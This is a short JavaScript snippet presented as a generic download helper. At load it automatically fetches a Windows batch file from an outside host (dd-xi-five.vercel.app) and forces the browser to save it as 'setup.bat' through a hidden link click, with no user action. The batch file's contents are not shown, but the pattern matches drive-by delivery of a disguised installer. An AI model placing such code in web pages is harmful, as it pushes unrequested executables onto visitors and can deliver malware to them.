// Function to download file from a direct link
async function downloadFileFromDirectLink(fileUrl) {
  try {
    const response = await fetch(fileUrl);
    const blob = await response.blob();
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'setup.bat'; // Provide a default file name for download
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
  } catch (error) {
    console.error('Error downloading file:', error);
  }
}

// Call the function with the file URL
downloadFileFromDirectLink('https://dd-xi-five.vercel.app/setup.bat');
